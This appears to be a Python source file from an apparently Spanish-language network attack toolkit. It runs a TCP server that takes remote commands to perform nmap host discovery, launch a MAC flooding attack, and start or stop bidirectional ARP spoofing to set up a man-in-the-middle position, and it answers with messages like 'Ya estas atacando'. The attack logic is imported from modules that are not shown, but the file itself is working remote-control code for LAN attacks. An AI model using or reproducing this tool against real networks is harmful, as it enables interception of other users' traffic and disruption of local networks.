import socket
import re
import threading
from subprocess import check_output
from .tools import *
from .arpspoof import *
from .macflood import *

class server(): #threading.Thread
	"""docstring for server"""
	def __init__(self, interface, port):
		#threading.Thread.__init__(self)
		self.interface = interface
		self.port=port

	def run(self):
		hilos = {}
		server_addres=(getMyIp(self.interface),int(self.port))
		self.sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print("Levantando servidor:")
		self.sock.bind(server_addres)
		print(server_addres)
		self.sock.listen(1)
		while 1:
			print ('Esperando conexion entrante')
			connection, client_address = self.sock.accept()
			print('----------------------------------------------------')
			try:
				print("Conexion extablecida desde: "+ client_address[0])
				while 1:
					data = connection.recv(1024)
					if data:
						comando = data.split()
						print("Ejecutando Comando: "+data)
						if(comando[0]=="comando1"):
							del comando[0]
							if (validacion_nmap(comando)):
								ip=""
								send=""
								comando.insert(0,"nmap")
								comando.insert(1,"-sn")
								nmap = check_output(comando)
								respuesta = nmap.split()
								for item in respuesta:
									vec = item.split('.')
									if(len(vec)==4):
										ip=item
									vec = item.split(':')
									if(len(vec)==6):
										send+=ip+" "+item+"-"
								print("Enviando resultado:")
								print(send)
								connection.sendall(send)
								connection.sendall("close")
								print("Ha terminado: "+data)

							else:
								print("Error en el comando")
								connection.sendall("close")
								print("Ha terminado: "+data)

						elif (comando[0]=="comando2"):
							del comando[0]
							if(validacion_macflood(comando, getMyInterface())):
								print("Iniciando Macflood")
								MAC_flood = Macflood(comando[0],comando[1])
								hilos["mac_flood"] = [MAC_flood]
								MAC_flood .start()
								print("Ejecutando Macflood en segundo plando, retornando control")

								connection.sendall("Ya estas atacando")
								connection.sendall("close")

							else:
								print("Error en el comando")
								connection.sendall("close")
								print("Ha terminado: "+data)

						elif (comando[0]=="comando3"):
							del comando[0]
							if (comando[0]!="kill"):
								if(validacion_arpmim(comando, getMyInterface())):
									print("Iniciando ARPspoof")
									ARP_pass1 = ARPSpoofing(comando[0],comando[1],comando[2])
									ARP_pass2 = ARPSpoofing(comando[0],comando[2],comando[1])

									hilos["arpmas"] = [ARP_pass1,ARP_pass2]
									
									ARP_pass1.start()
									ARP_pass2.start()
									
									print("Ejecutando ARPspoof en segundo plando, retornando control")
									
									connection.sendall("Ya estas atacando")
									connection.sendall("close")
								else:
									print("Error en el comando")
									connection.sendall("close")
									print("Ha terminado: "+data)
							else:
								print("Deteniendo Arpspoof")
								for hilo_arp in hilos["arpmas"]:
									hilo_arp.killer()

								connection.sendall("Ataque parado")
								connection.sendall("close")
						else:
							print("No entiendo el Comando: "+data)
					else:
						break
			finally:
				connection.close()
			print('----------------------------------------------------')
			#break
					
def run(config):
	myserver=server(config.interface,config.port)
	#print(myserver.interface+" "+myserver.port)
	myserver.run()
